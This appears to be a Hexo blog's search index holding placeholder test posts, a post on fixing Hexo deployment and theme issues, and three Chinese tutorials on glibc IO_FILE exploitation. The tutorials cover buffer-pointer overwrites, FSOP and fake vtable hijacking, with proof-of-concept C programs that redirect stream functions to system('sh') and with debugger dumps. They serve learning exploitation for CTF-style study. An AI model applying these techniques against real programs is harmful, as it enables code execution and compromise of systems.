<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[test3]]></title>
      <url>/2018/07/09/test/test3/</url>
      <content type="html"><![CDATA[<p>test3</p>
]]></content>
      
        <categories>
            
            <category> test </category>
            
        </categories>
        
        
        <tags>
            
            <tag> test1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[test2]]></title>
      <url>/2018/07/09/test/test2/</url>
      <content type="html"><![CDATA[<p>test2</p>
]]></content>
      
        <categories>
            
            <category> test </category>
            
        </categories>
        
        
        <tags>
            
            <tag> test1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[个人博客网站搭建中遇到的问题以及解决办法]]></title>
      <url>/2018/07/09/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="1-hexo-deploy卡死或报错"><a href="#1-hexo-deploy卡死或报错" class="headerlink" title="1. hexo deploy卡死或报错"></a>1. hexo deploy卡死或报错</h1><p>这是我最近遇到的问题，困扰了很长时间！</p>
<p>主要问题时因为hexo deploy中上传的内容比较大，而git push过程的是2B/s，直接导致最终上传不上去或者服务器返回超时或者ssl方面的错误。</p>
<p>解决办法：<a href="https://gist.github.com/laispace/666dd7b27e9116faece6" target="_blank" rel="external">挂代理</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git config --global https.proxy http://127.0.0.1:1080</div><div class="line">git config --global https.proxy https://127.0.0.1:1080</div><div class="line"></div><div class="line">git config --global --unset http.proxy</div><div class="line">git config --global --unset https.proxy</div><div class="line"></div><div class="line">npm config delete proxy</div></pre></td></tr></table></figure>
<h1 id="2-文章目录层级结构显示不全"><a href="#2-文章目录层级结构显示不全" class="headerlink" title="2. 文章目录层级结构显示不全"></a>2. 文章目录层级结构显示不全</h1><p>我们在使用侧边栏的时候，可能会有将文章目录结构全部显示的需求，但next/_config.yml不论如何设置都不会成功。这个时候就需要改源码。</p>
<p>next/source/css/_common/components/sidebar/sidebar-toc.styl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//.post-toc .nav .nav-child &#123; display: none; &#125;</div></pre></td></tr></table></figure>
<p>将上面那行注释掉即可</p>
<h1 id="3-文章目录自动无序列表"><a href="#3-文章目录自动无序列表" class="headerlink" title="3. 文章目录自动无序列表"></a>3. 文章目录自动无序列表</h1><p>当文章中没有1、2、3这样的章节标题设置时，我们很容易忽略层级关系；但是若加上1、2、3这样的章节标题，且next的toc设置中启用了自动添加数字时，就容易产生1.1.这样多次显示章节序列的问题。</p>
<p>解决办法：参考<a href="https://github.com/iissnan/hexo-theme-next/issues/857" target="_blank" rel="external">issue</a></p>
<p>next/_config.yml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># TOC in the Sidebar</div><div class="line">toc:</div><div class="line">  enable: true</div><div class="line"></div><div class="line">  # Automatically add list number to toc.</div><div class="line">  number: false</div></pre></td></tr></table></figure>
<p>将toc中的number设置为false</p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[新版本libc下IO_FILE的利用]]></title>
      <url>/2018/07/05/%E6%96%B0%E7%89%88%E6%9C%AClibc%E4%B8%8BIO-FILE%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="新版本libc下IO-FILE的利用"><a href="#新版本libc下IO-FILE的利用" class="headerlink" title="新版本libc下IO_FILE的利用"></a>新版本libc下IO_FILE的利用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在最新版本的glibc中(2.24)，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc 会在调用虚函数之前首先检查vtable地址的合法性。</p>
<p>如果vtable是非法的，那么会引发abort。</p>
<p>首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。</p>
<p>这里的检查使得以往使用vtable进行利用的技术很难实现</p>
<h2 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h2><p>在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。 前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE &#123;</div><div class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</div><div class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</div><div class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</div><div class="line">  char* _IO_read_ptr;   /* Current read pointer */</div><div class="line">  char* _IO_read_end;   /* End of get area. */</div><div class="line">  char* _IO_read_base;  /* Start of putback+get area. */</div><div class="line">  char* _IO_write_base; /* Start of put area. */</div><div class="line">  char* _IO_write_ptr;  /* Current put pointer. */</div><div class="line">  char* _IO_write_end;  /* End of put area. */</div><div class="line">  char* _IO_buf_base;   /* Start of reserve area. */</div><div class="line">  char* _IO_buf_end;    /* End of reserve area. */</div><div class="line">  /* The following fields are used to support backing up and undo. */</div><div class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</div><div class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</div><div class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</div><div class="line"></div><div class="line">  struct _IO_marker *_markers;</div><div class="line"></div><div class="line">  struct _IO_FILE *_chain;</div><div class="line"></div><div class="line">  int _fileno;</div><div class="line">  int _flags2;</div><div class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用。</p>
<p>在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>简单的观察一下_IO_FILE对于调用scanf的作用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">char buf[100];</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line"> char stack_buf[100];</div><div class="line"> scanf(&quot;%s&quot;,stack_buf);</div><div class="line"> scanf(&quot;%s&quot;,stack_buf);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在执行程序第一次使用stdin之前，stdin的内容还未初始化是空的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;== vtable</div></pre></td></tr></table></figure>
<p>调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</div></pre></td></tr></table></figure>
<p>进一步思考可以发现其实stdin初始化的内存是在堆上分配出来的，在这里堆的基址是0x602000，因为之前没有堆分配因此缓冲区的地址也是0x602010</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Start              End                Offset             Perm Path</div><div class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/1/t1</div><div class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</div></pre></td></tr></table></figure>
<p>分配的堆大小是0x400个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x602000:   0x0000000000000000  0x0000000000000411 &lt;== 分配0x400大小</div><div class="line">0x602010:   0x000000000a333231  0x0000000000000000 &lt;== 缓冲数据</div><div class="line">0x602020:   0x0000000000000000  0x0000000000000000</div><div class="line">0x602030:   0x0000000000000000  0x0000000000000000</div><div class="line">0x602040:   0x0000000000000000  0x0000000000000000</div></pre></td></tr></table></figure>
<p>接下来我们尝试修改_IO_buf_base来实现任意地址读写，全局缓冲区buf的地址是0x7ffff7dd2740。修改_IO_buf_base和_IO_buf_end到缓冲区buf的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013</div><div class="line">0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010</div><div class="line">0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010</div><div class="line">0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x00007ffff7dd2740 &lt;== _IO_buf_base</div><div class="line">0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;== _IO_buf_end</div><div class="line">0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff</div><div class="line">0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790</div><div class="line">0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000</div><div class="line">0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000</div><div class="line">0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0</div></pre></td></tr></table></figure>
<p>之后scanf的读入数据就会写入到0x7ffff7dd2740的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000</div><div class="line">0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div><div class="line">0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FSOP]]></title>
      <url>/2018/07/05/FSOP/</url>
      <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。</p>
<p>FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">_IO_flush_all_lockp (int do_lock)</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  fp = (_IO_FILE *) _IO_list_all;</div><div class="line">  while (fp != NULL)</div><div class="line">  &#123;</div><div class="line">       ...</div><div class="line">       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</div><div class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</div><div class="line">           &#123;</div><div class="line">               result = EOF;</div><div class="line">          &#125;</div><div class="line">        ...</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/2018-07-05/abort_routine.001.jpeg" alt="img"></p>
<p>而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
<p>1.当libc执行abort流程时</p>
<p>2.当执行exit函数时</p>
<p>3.当执行流从main函数返回时</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>梳理一下FSOP利用的条件，首先需要攻击者获知libc.so基址，因为_IO_list_all是作为全局变量储存在libc.so中的，不泄漏libc基址就不能改写_IO_list_all。</p>
<p>之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，</p>
<p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的vtable指针。但是为了能够让我们构造的fake_FILE能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</div><div class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</div><div class="line">           &#123;</div><div class="line">               result = EOF;</div><div class="line">          &#125;</div></pre></td></tr></table></figure>
<p>也就是</p>
<ul>
<li>fp-&gt;_mode &lt;= 0</li>
<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
</ul>
<p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的vtable和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode等数据域的偏移，这样可以在伪造的vtable中构造相应的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#define _IO_list_all 0x7ffff7dd2520</div><div class="line">#define mode_offset 0xc0</div><div class="line">#define writeptr_offset 0x28</div><div class="line">#define writebase_offset 0x20</div><div class="line">#define vtable_offset 0xd8</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    void *ptr;</div><div class="line">    long long *list_all_ptr;</div><div class="line"></div><div class="line">    ptr=malloc(0x200);</div><div class="line"></div><div class="line">    *(long long*)((long long)ptr+mode_offset)=0x0;</div><div class="line">    *(long long*)((long long)ptr+writeptr_offset)=0x1;</div><div class="line">    *(long long*)((long long)ptr+writebase_offset)=0x0;</div><div class="line">    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);</div><div class="line"></div><div class="line">    *(long long*)((long long)ptr+0x100+24)=0x41414141;</div><div class="line"></div><div class="line">    list_all_ptr=(long long *)_IO_list_all;</div><div class="line"></div><div class="line">    list_all_ptr[0]=ptr;</div><div class="line"></div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用分配内存的前0x100个字节作为_IO_FILE_plus，后0x100个字节作为vtable，在vtable中使用0x41414141这个地址作为伪造的_IO_overflow指针。</p>
<p>之后，覆盖位于libc中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。</p>
<p>通过调用exit函数，程序会执行 _IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---&gt; call _IO_overflow</div><div class="line">[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)</div><div class="line">[#1] 0x7ffff7a8932a → Name: _IO_cleanup()</div><div class="line">[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)</div><div class="line">[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)</div><div class="line">[#4] 0x4005ce → Name: main()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[伪造vtable劫持程序流程]]></title>
      <url>/2018/07/05/%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>前面我们介绍了Linux中文件流的特性（FILE），我们可以得知Linux中的一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。</p>
<p>因此伪造vtable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。</p>
<p>因此vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改vtable中的指针，首先需要知道_IO_FILE_plus位于哪里，对于fopen的情况下是位于堆内存，对于stdin\stdout\stderr是位于libc.so中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">void getshell()&#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_ptr;</div><div class="line">    mprotect(0x00007ffff7dcd000, 0x4000, 7);   // set IO_FILE rwx</div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</div><div class="line"></div><div class="line">    vtable_ptr[7]=0x400606; //xsputn</div><div class="line"></div><div class="line">    printf(&quot;call 0x400606&quot;); //getshell</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>根据vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系统下偏移是0xd8。之后需要搞清楚欲劫持的IO函数会调用vtable中的哪个函数。关于IO函数调用vtable的情况已经在FILE结构介绍一节给出了，知道了printf会调用vtable中的xsputn，并且xsputn的是vtable中第八项之后就可以写入这个指针进行劫持。</p>
<p>并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。</p>
<p>利用这点可以实现给劫持的vtable函数传參，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#define system_ptr 0x7ffff7a52390;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_ptr;</div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</div><div class="line"></div><div class="line">    memcopy(fp,&quot;sh&quot;,3);</div><div class="line"></div><div class="line">    vtable_ptr[7]=system_ptr //xsputn</div><div class="line"></div><div class="line"></div><div class="line">    fwrite(&quot;hi&quot;,2,1,fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<font color="#f00">但是在目前libc2.23版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。</font>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#define system_ptr 0x7ffff7a52390;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_addr,*fake_vtable;</div><div class="line"></div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    fake_vtable=malloc(0x40);</div><div class="line"></div><div class="line">    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset</div><div class="line"></div><div class="line">    vtable_addr[0]=(long long)fake_vtable;</div><div class="line"></div><div class="line">    memcpy(fp,&quot;sh&quot;,3);</div><div class="line"></div><div class="line">    fake_vtable[7]=system_ptr; //xsputn</div><div class="line"></div><div class="line">    fwrite(&quot;hi&quot;,2,1,fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们首先分配一款内存来存放伪造的vtable，之后修改_IO_FILE_plus的vtable指针指向这块内存。因为vtable中的指针我们放置的是system函数的地址，因此需要传递参数&quot;/bin/sh&quot;或&quot;sh&quot;。</p>
<p>因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把&quot;sh&quot;写入_IO_FILE_plus头部。之后对fwrite的调用就会经过我们伪造的vtable执行system(&quot;sh&quot;)。</p>
